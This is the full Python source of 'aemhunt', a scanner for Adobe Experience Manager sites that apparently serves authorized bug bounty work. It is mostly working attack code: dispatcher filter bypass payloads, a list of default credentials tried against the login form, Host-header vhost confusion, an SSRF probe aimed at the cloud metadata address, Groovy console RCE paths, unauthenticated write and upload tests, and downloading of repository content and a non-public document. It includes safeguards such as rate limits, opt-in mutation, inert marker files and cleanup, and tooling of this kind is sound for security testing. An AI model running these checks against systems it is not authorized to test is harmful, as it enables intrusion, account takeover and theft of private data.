#!/usr/bin/env python3
"""
aemhunt — Adobe Experience Manager assessment tool for authorized testing.

Three phases:
  1. DETECT    is this AEM, and which tier (author / publish / dispatcher)
  2. ASSESS    run vulnerability checks, confirm each against a control
  3. COLLECT   gather bounded evidence for whatever was confirmed

Written for an authorized bug bounty engagement. Read the safety notes in
--help before pointing it at anything.
"""

import argparse
import concurrent.futures
import json
import os
import re
import sys
import threading
import time
from datetime import datetime, timezone
from urllib.parse import quote, urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

# ---------------------------------------------------------------- colour

ANSI = {
    CRIT:     "\033[1;95m",   # bright magenta
    HIGH:     "\033[1;91m",   # bright red
    MED:      "\033[1;93m",   # bright yellow
    LOW:      "\033[1;96m",   # bright cyan
    INFO:     "\033[0;37m",   # grey
    "ok":     "\033[1;92m",   # green   — 200
    "warn":   "\033[0;93m",   # yellow  — 3xx
    "bad":    "\033[0;91m",   # red     — 401/403
    "dim":    "\033[0;90m",
    "b":      "\033[1m",
    "head":   "\033[1;36m",
    "x":      "\033[0m",
}

_COLOR = True  # on by default; --no-color or a NO_COLOR env var turns it off


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    """Wrap s in an ANSI colour, or return it untouched when colour is off."""
    if not _COLOR:
        return s
    return f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    """Pick a colour for an HTTP status by class."""
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if code == 200:
        return "ok"
    if 300 <= code < 400:
        return "warn"
    if code in (401, 403):
        return "bad"
    return "dim"


# ---------------------------------------------------------------- status

class Status:
    """
    Periodic status heartbeat for list mode (-l).

    Emitted on a timer from a daemon thread, so it fires at a steady wall-clock
    interval regardless of verbosity and regardless of how long any one host
    takes. Prints whole lines rather than redrawing in place: at -v 1 the output
    scrolls constantly, so an in-place indicator would be unreadable.

    Not used for a single target (-u) -- one host needs no queue accounting.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, c = self.done, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ---------------------------------------------------------------- console

class Console:
    """v=0 prints confirmed findings only. v=1 prints every probe."""

    def __init__(self, level):
        self.level = level
        self._lk = threading.Lock()

    def line(self, msg):
        """Print one whole line atomically — used by the Status heartbeat."""
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def finding(self, target, sev, title, detail=""):
        with self._lk:
            print(f"{paint('['+sev+']', sev)} {paint(target, 'b')}  {paint(title, sev)}")
            if detail:
                for line in detail.splitlines():
                    print(f"        {paint(line, 'dim')}")
            sys.stdout.flush()

    def probe(self, target, name, result, extra=""):
        if self.level < 1:
            return
        with self._lk:
            print(f"  {paint('·', 'dim')}  {paint(target, 'dim')}  "
                  f"{name:<34} {paint(str(result), status_key(result))} "
                  f"{paint(extra, 'dim')}")
            sys.stdout.flush()

    def info(self, msg):
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def warn(self, msg):
        with self._lk:
            print(f"{paint('[!]', 'bad')} {msg}", file=sys.stderr)
            sys.stderr.flush()


# ---------------------------------------------------------------- http

class Http:
    def __init__(self, console, timeout=15, rate=8.0, verify=False, proxy=None):
        self.con, self.timeout, self.verify = console, timeout, verify
        self.s = requests.Session()
        self.s.headers["User-Agent"] = UA
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self._min_gap = 1.0 / rate if rate > 0 else 0.0
        self._last = 0.0
        self._lk = threading.Lock()
        self.count = 0

    def _throttle(self):
        with self._lk:
            gap = time.time() - self._last
            if gap < self._min_gap:
                time.sleep(self._min_gap - gap)
            self._last = time.time()
            self.count += 1

    def req(self, method, url, host=None, **kw):
        headers = dict(kw.pop("headers", {}))
        if host:
            headers["Host"] = host
        self._throttle()
        try:
            return self.s.request(
                method, url, headers=headers, timeout=self.timeout,
                verify=self.verify, allow_redirects=False,
                proxies=self.proxies, **kw)
        except requests.RequestException:
            return None

    def get(self, url, **kw):
        return self.req("GET", url, **kw)

    def post(self, url, **kw):
        return self.req("POST", url, **kw)


# ---------------------------------------------------------------- model

class Finding:
    def __init__(self, target, sev, title, detail="", evidence=None):
        self.target, self.sev, self.title = target, sev, title
        self.detail, self.evidence = detail, evidence or {}
        self.when = datetime.now(timezone.utc).isoformat()

    def as_dict(self):
        return {"target": self.target, "severity": self.sev, "title": self.title,
                "detail": self.detail, "evidence": self.evidence, "timestamp": self.when}


# ---------------------------------------------------------------- payloads

CONSOLE_PATHS = [
    "/system/console", "/system/console/bundles", "/system/console/configMgr",
    "/system/console/status-System%20Properties", "/system/console/jmx",
    "/crx/de/index.jsp", "/crx/packmgr/index.jsp", "/crx/packmgr/service.jsp",
    "/crx/explorer/index.jsp", "/crx/server/crx.default/jcr:root.1.json",
]

# Dispatcher filters usually match on the literal path. These variants aim to
# reach the same servlet by a spelling the filter did not anticipate.
BYPASS_TMPL = [
    "{p}.css", "{p}.html", "{p}.json", "{p}.ico", "{p}.png",
    "{p}.4.json", "{p};.css", "{p};a=b.css", "{p}/.css", "{p}%0a.css",
    "//{p}", "///{p}", "/./{p}", "/a/../{p}", "/etc/../{p}", "/%2e/{p}",
]

SENSITIVE_SERVLETS = [
    ("/bin/querybuilder.json?path=/home/users&p.limit=5", "QueryBuilder (user enum)", HIGH),
    ("/bin/querybuilder.json?path=/&p.limit=5", "QueryBuilder (repo-wide)", HIGH),
    ("/bin/wcm/search/gql.servlet.json?path=/&type=cq:Page", "GQL servlet", MED),
    ("/libs/granite/security/currentuser.json", "current-user servlet", LOW),
    ("/libs/cq/security/userinfo.json", "userinfo servlet", MED),
    ("/system/sling/loginstatus.json", "Sling login status", LOW),
    ("/libs/opensocial/proxy?url=http://169.254.169.254/", "OpenSocial proxy (SSRF)", HIGH),
    ("/libs/dam/merge/metadata.json", "DAM metadata merge", LOW),
    ("/etc/groovyconsole.html", "ACS Groovy console", CRIT),
    ("/bin/groovyconsole/post.json", "Groovy console POST (RCE)", CRIT),
]

JCR_ROOTS = [
    "/content", "/content/dam", "/content/usergenerated", "/content/projects",
    "/content/experience-fragments", "/content/campaigns", "/content/forms",
    "/conf", "/etc", "/var", "/apps", "/libs", "/home", "/home/users",
    "/home/groups", "/tmp", "/oak:index", "/jcr:system",
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("author", "author"), ("anonymous", "anonymous"),
    ("replication-receiver", "replication-receiver"),
    ("vgnadmin", "vgnadmin"), ("oauthservice", "oauthservice"),
    ("aparker@geometrixx.info", "aparker"), ("jdoe@geometrixx.info", "jdoe"),
    ("grios@geometrixx.info", "grios"), ("james@geometrixx.info", "james"),
]

# Bare internal ServerNames. A dispatcher that resolves these from a
# client-supplied Host header may apply a vhost whose auth rules differ.
VHOST_NAMES = ["publish", "author", "localhost", "127.0.0.1",
               "aem-publish", "aem-author", "dispatcher"]

JCR_PRIVS = ["jcr:read", "jcr:write", "jcr:all", "rep:write", "jcr:addChildNodes",
             "jcr:modifyProperties", "jcr:removeNode", "jcr:nodeTypeManagement",
             "jcr:modifyAccessControl", "crx:replicate"]


# ---------------------------------------------------------------- scanner

class AemHunter:
    def __init__(self, http, console, args, status=None):
        self.h, self.con, self.args = http, console, args
        self.status = status
        self.findings = []
        self._lk = threading.Lock()

    def add(self, f):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f.target, f.sev, f.title, f.detail)

    # ---------- phase 1: detection

    def detect(self, base):
        r = self.h.get(base + "/")
        if r is None:
            self.con.probe(base, "reachable", "no response")
            return None

        sig = {"vhost": r.headers.get("X-Vhost"),
               "dispatcher": r.headers.get("X-Dispatcher"),
               "server": r.headers.get("Server"),
               "status": r.status_code,
               "location": r.headers.get("Location", "")}

        markers = 0
        if sig["vhost"] or sig["dispatcher"]:
            markers += 2
        if "granite" in sig["location"] or "login.html" in sig["location"]:
            markers += 2

        probe = self.h.get(base + "/libs/granite/core/content/login.html")
        if probe is not None and probe.status_code == 200 and "AEM Sign In" in probe.text:
            markers += 3
            sig["login"] = "/libs/granite/core/content/login.html"
        if probe is None or probe.status_code != 200:
            alt = self.h.get(base + "/apps/granite/core/content/login.html")
            if alt is not None and alt.status_code == 200 and "AEM" in alt.text:
                markers += 3
                sig["login"] = "/apps/granite/core/content/login.html"

        d = self.h.get(base + "/libs/cq/i18n/dict.en.json")
        if d is not None and d.status_code == 200 and d.headers.get(
                "Content-Type", "").startswith("application/json"):
            markers += 2
            sig["i18n"] = True

        sig["is_aem"] = markers >= 3
        sig["tier"] = sig["vhost"] or ("author" if "login" in sig else "unknown")
        self.con.probe(base, "detect AEM",
                       "YES" if sig["is_aem"] else "no", f"(score {markers})")
        if sig["is_aem"]:
            bits = [f"tier={sig['tier']}"]
            if sig["dispatcher"]:
                bits.append(f"dispatcher={sig['dispatcher']}")
            if sig["server"]:
                bits.append(f"server={sig['server']}")
            self.add(Finding(base, INFO, "Adobe Experience Manager detected",
                             " ".join(bits), sig))
        return sig if sig["is_aem"] else None

    # ---------- phase 2: checks

    def check_consoles(self, base):
        for p in CONSOLE_PATHS:
            r = self.h.get(base + p)
            if r is None:
                continue
            hit = r.status_code == 200 and len(r.content) > 250
            self.con.probe(base, f"console {p}", r.status_code, f"({len(r.content)}b)")
            if hit:
                self.add(Finding(base, CRIT, f"Admin console exposed: {p}",
                                 f"HTTP 200, {len(r.content)} bytes — unauthenticated.",
                                 {"path": p, "len": len(r.content)}))

    def check_dispatcher_bypass(self, base):
        """Only report a variant that beats the plain path's own result."""
        for p in ["/system/console/bundles", "/crx/de/index.jsp"]:
            plain = self.h.get(base + p)
            if plain is None or plain.status_code == 200:
                continue
            for tmpl in BYPASS_TMPL:
                cand = tmpl.format(p=p.lstrip("/"))
                if not cand.startswith("/"):
                    cand = "/" + cand
                r = self.h.get(base + cand)
                if r is None:
                    continue
                self.con.probe(base, f"bypass {cand[:40]}", r.status_code)
                if r.status_code == 200 and len(r.content) > 250:
                    self.add(Finding(base, CRIT, f"Dispatcher filter bypass: {cand}",
                                     f"Plain {p} -> {plain.status_code}; variant -> 200 "
                                     f"({len(r.content)} bytes).",
                                     {"path": cand, "baseline": plain.status_code}))
                    break

    def check_vhost_confusion(self, base):
        """
        Send an internal ServerName as the Host header. If a path that needs
        auth under the real hostname returns content under a bare vhost name,
        the dispatcher is applying a config whose auth rules differ.
        """
        probe_path = "/content/dam.1.json"
        real = self.h.get(base + probe_path)
        if real is None:
            return
        base_code = real.status_code
        self.con.probe(base, "vhost baseline", base_code)
        if base_code == 200:
            return  # nothing gated to bypass

        host_only = urlparse(base).hostname
        for vh in VHOST_NAMES + [host_only.split(".", 1)[-1]]:
            r = self.h.get(base + probe_path, host=vh)
            if r is None:
                continue
            self.con.probe(base, f"vhost Host:{vh}", r.status_code,
                           f"({len(r.content)}b)")
            if r.status_code == 200 and len(r.content) > 100:
                self.add(Finding(
                    base, HIGH, f"Host-header vhost confusion (Host: {vh})",
                    f"{probe_path} returns {base_code} with the real Host, but 200 "
                    f"({len(r.content)} bytes) with 'Host: {vh}'. Unauthenticated "
                    f"repository read.",
                    {"host": vh, "path": probe_path, "baseline": base_code,
                     "bypass_len": len(r.content),
                     "curl": f"curl -sk '{base}{probe_path}' -H 'Host: {vh}'"}))
                return vh
        return None

    def check_jcr_serialization(self, base, host=None):
        """Sling default GET servlet exposing repository nodes as JSON."""
        opened = []
        for root in JCR_ROOTS:
            for sel in [".1.json", ".json"]:
                r = self.h.get(base + root + sel, host=host)
                if r is None:
                    continue
                ok = (r.status_code == 200
                      and "json" in r.headers.get("Content-Type", "")
                      and r.text.strip().startswith("{"))
                self.con.probe(base, f"jcr {root}{sel}", r.status_code,
                               f"({len(r.content)}b)")
                if ok:
                    sev = HIGH if root in ("/home/users", "/home", "/conf", "/etc") else MED
                    self.add(Finding(
                        base, sev, f"Unauthenticated JCR serialization: {root}{sel}",
                        f"{len(r.content)} bytes of repository content"
                        + (f" via Host: {host}" if host else ""),
                        {"path": root + sel, "host": host, "len": len(r.content)}))
                    opened.append(root)
                    break
        return opened

    def check_servlets(self, base, host=None):
        for path, name, sev in SENSITIVE_SERVLETS:
            r = self.h.get(base + path, host=host)
            if r is None:
                continue
            self.con.probe(base, f"servlet {name}", r.status_code, f"({len(r.content)}b)")
            if r.status_code == 200 and len(r.content) > 40:
                self.add(Finding(base, sev, f"Sensitive servlet reachable: {name}",
                                 f"{path} -> 200 ({len(r.content)} bytes)",
                                 {"path": path, "host": host}))

    def check_error_handler(self, base, host=None):
        r = self.h.get(base + "/", host=host)
        if r is None or r.status_code < 500:
            return
        pats = [(r"Compilation errors in ([^\s<]+)", "generated servlet path"),
                (r"(com\.[a-z0-9_.]+\.[A-Z][A-Za-z0-9_]+)", "internal Java class"),
                (r"Cannot serve request to ([^\s<]+)", "internal content path"),
                (r'data-routing="([^"]+)"', "environment metadata")]
        leaks = []
        for rx, label in pats:
            m = re.search(rx, r.text)
            if m:
                leaks.append(f"{label}: {m.group(1)}")
        self.con.probe(base, "error handler", r.status_code,
                       f"({len(leaks)} leaks)")
        if leaks:
            self.add(Finding(base, LOW, "Default Sling error handler leaks internals",
                             "\n".join(leaks), {"leaks": leaks}))

    def check_default_creds(self, base, login_path):
        """
        Small fixed list of vendor defaults — not a brute force. Also watches
        for distinct j_reason codes, which are an account-state oracle.
        """
        endpoint = base + login_path + "/j_security_check"
        reasons = {}
        for user, pw in DEFAULT_CREDS:
            r = self.h.post(endpoint,
                            data={"_charset_": "UTF-8", "j_username": user,
                                  "j_password": pw, "resource": "/"},
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
            if r is None:
                continue
            loc = r.headers.get("Location", "")
            m = re.search(r"j_reason_code=([a-z_]+)", loc)
            reason = m.group(1) if m else None
            token = "login-token=" in r.headers.get("Set-Cookie", "") and \
                    not re.search(r"login-token=;", r.headers.get("Set-Cookie", ""))
            self.con.probe(base, f"cred {user}:{pw}", r.status_code, f"({reason})")

            if r.status_code in (200, 302) and token and reason is None:
                self.add(Finding(base, CRIT, f"Default credentials accepted: {user}:{pw}",
                                 "Session token issued.", {"user": user}))
            if reason:
                reasons.setdefault(reason, []).append(user)

        if len(reasons) > 1:
            common = max(reasons, key=lambda k: len(reasons[k]))
            odd = {k: v for k, v in reasons.items() if k != common}
            self.add(Finding(
                base, LOW, "Username enumeration via login error codes",
                "Distinct j_reason_code by account: "
                + "; ".join(f"{k} -> {', '.join(v)}" for k, v in odd.items())
                + f" (all others: {common}). Confirm password-independence before reporting.",
                {"reasons": {k: v for k, v in reasons.items()}}))

    # ----- permissions: declared vs observed

    def check_declared_privileges(self, base, path, host=None):
        """
        Ask the Granite permissions servlet what the anonymous session can do.

        This is the target describing itself, so treat it as triage, not proof
        — check_read/check_write below establish the same thing empirically.

        Note: repeated ?privileges= params, never comma-separated. The servlet
        treats a comma string as one unknown privilege and returns false, which
        reads as 'denied' when it actually means 'not understood'.
        """
        qs = "&".join(f"privileges={quote(p)}" for p in JCR_PRIVS)
        r = self.h.get(f"{base}{path}.permissions.json?{qs}", host=host)
        if r is None or r.status_code != 200:
            self.con.probe(base, f"perms declared {path}", "unavailable")
            return None
        try:
            data = r.json()
        except ValueError:
            return None
        granted = sorted(k for k, v in data.items() if v is True)
        self.con.probe(base, f"perms declared {path}", "ok", f"granted={granted or 'none'}")
        writes = [p for p in granted if p != "jcr:read"]
        if writes:
            self.add(Finding(base, CRIT, f"Write privileges declared on {path}",
                             "Servlet reports granted: " + ", ".join(writes)
                             + "\nConfirm empirically before reporting.",
                             {"granted": granted, "source": "declared"}))
        return data

    def check_read(self, base, path, host=None):
        """READ: fetch the node and require real JSON back."""
        r = self.h.get(f"{base}{path}.json", host=host)
        ok = (r is not None and r.status_code == 200
              and "json" in r.headers.get("Content-Type", "")
              and r.text.strip().startswith("{"))
        self.con.probe(base, f"perm READ {path}",
                       r.status_code if r is not None else "err",
                       "(granted)" if ok else "(denied)")
        if ok:
            self.add(Finding(base, MED, f"READ permission confirmed on {path}",
                             f"Anonymous GET returned {len(r.content)} bytes of JCR JSON.",
                             {"path": path, "bytes": len(r.content),
                              "source": "observed", "permission": "read"}))
        return ok

    def check_write(self, base, path, host=None):
        """
        WRITE: create one labelled node, verify it exists, delete it, verify
        it is gone. Opt-in via --allow-write because it mutates the target.

        A 200 alone does not mean success — Sling answers 200 for rejected
        operations too. The node has to actually be there afterwards.
        """
        node = f"{path}/zz-aemhunt-writetest-{int(time.time())}"
        r = self.h.post(base + node, host=host,
                        data={"jcr:primaryType": "sling:Folder"},
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
        if r is None:
            self.con.probe(base, "perm WRITE", "err")
            return False

        chg = re.search(r'id="ChangeLog">([^<]*)<', r.text or "")
        changed = bool(chg and chg.group(1).strip())
        v = self.h.get(base + node + ".json", host=host)
        exists = v is not None and v.status_code == 200
        self.con.probe(base, f"perm WRITE {path}", r.status_code,
                       f"(changelog={'yes' if changed else 'empty'}, "
                       f"node={'present' if exists else 'absent'})")

        if exists:
            self.add(Finding(base, CRIT, f"WRITE permission confirmed on {path}",
                             f"Created {node} as an unauthenticated user.\n"
                             f"Deleting it now.",
                             {"node": node, "source": "observed", "permission": "write"}))
            self._cleanup(base, node, host)
            return True

        self.add(Finding(base, INFO, f"WRITE denied on {path}",
                         "Node creation rejected — no repository change.",
                         {"path": path, "source": "observed", "permission": "write",
                          "http": r.status_code, "changelog_empty": not changed}))
        return False

    # ----- file upload proof of concept

    def check_upload(self, base, path, host=None):
        """
        Upload one inert marker file to prove file-write, then remove it.
        Opt-in via --allow-upload.

        This is a proof of concept and nothing more. The payload and the .txt
        extension are hardcoded and not operator-controllable, so the function
        cannot be pointed at a webshell: no .jsp/.jspx/.html/.svg is ever
        written. Demonstrating that a file lands is the finding; leaving
        executable content on someone's server is not part of it.
        """
        ts = int(time.time())
        name = f"aemhunt-poc-{ts}.txt"
        body = (b"aemhunt proof-of-concept marker\n"
                b"Authorized security assessment. Inert file, no executable content.\n"
                b"Safe to delete.\n")

        vectors = [
            ("createasset servlet", "POST", f"{base}{path}.createasset.html",
             {"file": (name, body, "text/plain")}, {"fileName": name}),
            ("Sling POST multipart", "POST", f"{base}{path}/{name}",
             {"./jcr:content/renditions/original": (name, body, "text/plain")},
             {"jcr:primaryType": "dam:Asset"}),
            ("Sling star upload", "POST", f"{base}{path}/",
             {"*": (name, body, "text/plain")}, {}),
        ]

        for label, method, url, files, data in vectors:
            r = self.h.req(method, url, host=host, files=files, data=data)
            if r is None:
                continue
            landed = f"{path}/{name}"
            v = self.h.get(base + quote(landed), host=host)
            present = (v is not None and v.status_code == 200
                       and body[:20] in (v.content or b""))
            self.con.probe(base, f"upload {label}", r.status_code,
                           f"(file={'present' if present else 'absent'})")
            if present:
                self.add(Finding(
                    base, CRIT, f"Unauthenticated file upload at {path}",
                    f"Vector: {label}\nUploaded {landed} ({len(body)} bytes) and "
                    f"read it back. Inert .txt marker — no executable content.\n"
                    f"Deleting it now.",
                    {"vector": label, "path": landed, "bytes": len(body),
                     "permission": "upload"}))
                self._cleanup(base, landed, host)
                return True

        self.add(Finding(base, INFO, f"File upload denied at {path}",
                         "All three upload vectors rejected.",
                         {"path": path, "permission": "upload"}))
        return False

    def _cleanup(self, base, node, host=None):
        """Remove something we created, then prove it is gone."""
        self.h.post(base + quote(node), host=host, data={":operation": "delete"},
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
        v = self.h.get(base + quote(node) + ".json", host=host)
        code = v.status_code if v is not None else "unknown"
        gone = code in (404, 403)
        msg = f"    cleanup {node} -> HTTP {code} " + ("(removed)" if gone else
                                                       "(STILL PRESENT — remove manually)")
        self.con.info(paint(msg, "ok" if gone else "bad"))
        if not gone:
            self.add(Finding(base, HIGH, "Cleanup failed — artifact left on target",
                             f"Could not delete {node}. Remove it manually and "
                             f"disclose it in the report.", {"node": node}))

    # ---------- phase 3: bounded evidence collection

    def collect(self, base, root, host=None, outdir=None):
        """
        Walk the readable tree to size the exposure and save proof.

        Deliberately bounded by --max-nodes. The goal is to show scope, not to
        take a copy of the repository: over-collecting is both bad practice on
        someone else's production system and unnecessary for a report.
        """
        cap = self.args.max_nodes
        queue, seen, assets, visited = [root], set(), [], 0

        while queue and visited < cap:
            path = queue.pop(0)
            if path in seen:
                continue
            seen.add(path)
            visited += 1
            r = self.h.get(f"{base}{path}.1.json", host=host)
            if r is None or r.status_code != 200:
                continue
            try:
                data = r.json()
            except ValueError:
                continue
            for name, val in data.items():
                if not isinstance(val, dict) or name.startswith(("jcr:", "rep:", "dam:batch")):
                    continue
                child = f"{path}/{name}"
                ptype = val.get("jcr:primaryType", "?")
                if "Folder" in ptype:
                    queue.append(child)
                elif ptype == "dam:Asset":
                    assets.append(child)
            self.con.probe(base, f"walk {path[:44]}", "ok",
                           f"({visited}/{cap}, queue={len(queue)})")

        docs = [a for a in assets
                if re.search(r"\.(pdf|docx?|xlsx?|pptx?|csv|zip)$", a, re.I)]
        self.add(Finding(
            base, INFO, f"Exposure sized under {root}",
            f"{visited} nodes walked (cap {cap}), {len(assets)} assets, "
            f"{len(docs)} documents, {len(queue)} folders left unvisited"
            + (" — tree is larger than enumerated" if queue else ""),
            {"visited": visited, "assets": len(assets), "documents": len(docs),
             "unvisited": len(queue)}))

        if outdir:
            os.makedirs(outdir, exist_ok=True)
            tag = re.sub(r"\W+", "_", urlparse(base).hostname or "target")
            with open(os.path.join(outdir, f"{tag}_tree.txt"), "w") as fh:
                fh.write("\n".join(sorted(seen | set(assets))))
            if docs and self.args.proof:
                sample = docs[0]
                url = base + quote(sample)
                rr = self.h.get(url, host=host)
                if rr is not None and rr.status_code == 200:
                    fn = os.path.join(outdir, f"{tag}_proof_" + os.path.basename(sample))
                    with open(fn, "wb") as fh:
                        fh.write(rr.content)
                    self.add(Finding(
                        base, HIGH, "Non-public document retrieved (proof of read)",
                        f"{sample}\n{len(rr.content)} bytes -> {fn}",
                        {"asset": sample, "bytes": len(rr.content), "saved": fn}))
        return assets

    # ---------- driver

    def run(self, base):
        base = base.rstrip("/")
        if not urlparse(base).scheme:
            base = "https://" + base

        sig = self.detect(base)
        if not sig:
            self.con.probe(base, "summary", "not AEM — skipping")
            return

        self.check_consoles(base)
        self.check_dispatcher_bypass(base)
        self.check_servlets(base)
        self.check_error_handler(base)

        # roots readable without any bypass get the same permission treatment
        for root in self.check_jcr_serialization(base):
            self.check_declared_privileges(base, root)
            self.check_read(base, root)
            if self.args.allow_write:
                self.check_write(base, root)
            if self.args.allow_upload:
                self.check_upload(base, root)
            if self.args.collect:
                self.collect(base, root, outdir=self.args.outdir)

        if sig.get("login"):
            self.check_default_creds(base, sig["login"])

        vh = self.check_vhost_confusion(base)
        if vh:
            self.check_error_handler(base, host=vh)
            self.check_servlets(base, host=vh)
            roots = self.check_jcr_serialization(base, host=vh)
            for root in roots:
                self.check_declared_privileges(base, root, host=vh)
                self.check_read(base, root, host=vh)
                if self.args.allow_write:
                    self.check_write(base, root, host=vh)
                if self.args.allow_upload:
                    self.check_upload(base, root, host=vh)
                if self.args.collect:
                    self.collect(base, root, host=vh, outdir=self.args.outdir)


# ---------------------------------------------------------------- cli

BANNER = r"""
  aemhunt — Adobe Experience Manager assessment
  authorized testing only
"""

EPILOG = """
safety
  Every target you supply is requested. There is no allowlist, so the target
  list is the only thing keeping this in scope -- feed it a pre-filtered file
  (e.g. -l hosts-scope.txt) rather than a raw recon dump.

  The default run is read-only. Both mutating tests are opt-in and both clean
  up after themselves, then verify the cleanup worked:
    --allow-write   creates one node, confirms it exists, deletes it
    --allow-upload  uploads one inert .txt marker, reads it back, deletes it

  The upload PoC cannot drop a webshell. Filename and content are hardcoded to
  an inert .txt; no .jsp/.jspx/.html/.svg is ever written. Proving a file lands
  is the finding — leaving executable content behind is not part of it.

  Collection is capped (--max-nodes). Enumerate enough to size the exposure and
  prove the finding; do not take a copy of someone's production repository.

colour
  On by default. Disable with --no-color, or by setting NO_COLOR=1 in the
  environment. Worth doing when piping to a file or a log.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity:
  hosts tested / total, hosts remaining, and findings by severity. Not shown
  for -u, where there is no queue to account for.

examples
  aemhunt.py -u https://target.example.com -v 1
  aemhunt.py -l hosts-scope.txt --collect --outdir evidence/
  aemhunt.py -l hosts-scope.txt --no-color -o findings.json
  aemhunt.py -u https://target.example.com --collect --proof --allow-write
"""


def main():
    ap = argparse.ArgumentParser(
        prog="aemhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-v", type=int, default=0, choices=[0, 1], dest="verbosity",
                    help="0 = confirmed findings only (default), 1 = every probe")
    ap.add_argument("-u", "--url", help="single target URL")
    ap.add_argument("-l", "--list", help="file of target URLs, one per line")
    ap.add_argument("--no-color", action="store_true",
                    help="disable coloured output (colour is on by default)")
    ap.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                    help="seconds between status lines in -l mode (default 30)")
    ap.add_argument("-t", "--threads", type=int, default=4, help="concurrent targets (default 4)")
    ap.add_argument("--rate", type=float, default=8.0, help="max requests/sec (default 8)")
    ap.add_argument("--timeout", type=int, default=15, help="per-request timeout (default 15)")
    ap.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080 for Caido/Burp")
    ap.add_argument("--verify-tls", action="store_true", help="verify certificates (default off)")
    ap.add_argument("--collect", action="store_true", help="phase 3: bounded tree walk")
    ap.add_argument("--proof", action="store_true", help="retrieve ONE document as proof")
    ap.add_argument("--max-nodes", type=int, default=200, help="collection cap (default 200)")
    ap.add_argument("--allow-write", action="store_true",
                    help="WRITE test: create one labelled node, verify, delete (mutates target)")
    ap.add_argument("--allow-upload", action="store_true",
                    help="UPLOAD PoC: put one inert .txt marker, verify, delete "
                         "(mutates target; never uploads executable content)")
    ap.add_argument("--outdir", default="aemhunt-evidence", help="evidence directory")
    ap.add_argument("-o", "--json", help="write findings to JSON")
    args = ap.parse_args()

    if not args.url and not args.list:
        ap.error("need -u or -l")

    set_color(not (args.no_color or os.environ.get("NO_COLOR")))

    targets = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        with open(args.list) as fh:
            targets += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    targets = list(dict.fromkeys(targets))

    con = Console(args.verbosity)
    # heartbeat only in list mode (-l); a single target needs no queue accounting
    status = Status(con, len(targets), interval=args.status_interval,
                    enabled=bool(args.list))

    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(targets)), 'b')}   "
          f"threads {args.threads}   rate {args.rate}/s")
    print(f"  write   {paint('ON', 'bad') if args.allow_write else paint('off', 'ok')}"
          f"        upload  "
          f"{paint('ON (inert .txt only)', 'bad') if args.allow_upload else paint('off', 'ok')}"
          + (f"        status every {args.status_interval:.0f}s" if status.enabled else ""))
    print()

    http = Http(con, timeout=args.timeout, rate=args.rate,
                verify=args.verify_tls, proxy=args.proxy)
    hunter = AemHunter(http, con, args, status)
    started = time.time()
    status.start()

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as pool:
            futs = {pool.submit(hunter.run, t): t for t in targets}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    fut.result()
                except Exception as e:
                    con.warn(f"{futs[fut]}: {type(e).__name__}: {e}")
                finally:
                    status.host_done()
    finally:
        status.stop()
        status.emit(label="final")

    real = [f for f in hunter.findings if f.sev != INFO]
    print(f"\n  {paint(str(len(real)), 'b')} findings "
          f"({len(hunter.findings)} incl. info) "
          f"from {http.count} requests in {time.time()-started:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")

    if args.json:
        with open(args.json, "w") as fh:
            json.dump([f.as_dict() for f in
                       sorted(hunter.findings, key=lambda x: _SEV_ORDER[x.sev])],
                      fh, indent=2)
        print(f"\n  findings -> {args.json}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\ninterrupted")
